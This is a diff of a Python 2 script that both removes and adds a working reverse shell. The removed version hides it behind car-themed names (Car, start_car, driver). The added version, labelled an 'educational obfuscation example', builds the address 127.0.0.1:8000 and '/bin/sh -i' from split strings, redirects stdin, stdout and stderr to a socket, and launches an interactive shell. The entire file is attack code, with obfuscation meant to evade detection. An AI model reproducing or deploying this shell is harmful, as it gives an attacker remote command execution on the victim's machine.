@@ -1,32 +1,47 @@
-import os as drive
-import subprocess as destination
-import socket as my_friend
-class Car:
-	def __init__(self):
-		self.driver="127"
-		self.driver=self.driver+".0"
-		self.driver=self.driver+".0.1"
-		self.house_no=100*80
-		self.door=""
-		self.address="/"
-		self.address=self.address+"b"+""+"i"+"n"+"/"
-		self.address=self.address+"s"+""+"h"+""+""
-		self.car="-"
-		self.car=self.car+"i"
-		ctr=0
-		
-	def start_car(self):
-		friends_house=my_friend.socket
-		road=friends_house(my_friend.AF_INET,my_friend.SOCK_STREAM)
-		goto=road.connect
-		goto((self.driver,self.house_no))
-		lane=road.fileno
-		drive.dup2(lane(),0)
-		drive.dup2(lane(),1)
-		drive.dup2(lane(),2)
-		drive_to=destination.call
-		p=drive_to([self.address,self.car])
+#!/usr/bin/env python
+"""
+🏎️ Custom Shell Launcher (Obfuscated)
+Another educational obfuscation example to launch a shell.
+"""
 
-driver=Car()
-driver.start_car()
-		
+import os as sys_core
+import subprocess as sub_proc
+import socket as net_sock
+
+class ShellLauncher:
+    def __init__(self):
+        # 🧩 IP: 127.0.0.1
+        self.ip = "127" + ".0" + ".0.1"
+        # 🔢 Port: 8000
+        self.port = 100 * 80
+        # 🐚 Bin: /bin/sh
+        self.bin = "/" + "b" + "i" + "n" + "/" + "s" + "h"
+        # 🚗 Arg: -i
+        self.arg = "-" + "i"
+        
+        print "🏎️  Launcher Configured."
+        print "    Target: " + self.ip + ":" + str(self.port)
+
+    def launch(self):
+        try:
+            # 🛣️ Connect
+            s = net_sock.socket(net_sock.AF_INET, net_sock.SOCK_STREAM)
+            s.connect((self.ip, self.port))
+            
+            # 🌉 File Descriptors
+            # Redirecting stdin(0), stdout(1), stderr(2) to socket
+            fd = s.fileno()
+            sys_core.dup2(fd, 0)
+            sys_core.dup2(fd, 1)
+            sys_core.dup2(fd, 2)
+            
+            # 🚀 Execute
+            print "    🚀 Launching Process..."
+            sub_proc.call([self.bin, self.arg])
+            
+        except Exception as e:
+            print "    💥 Failed: " + str(e)
+
+if __name__ == "__main__":
+    launcher = ShellLauncher()
+    launcher.launch()
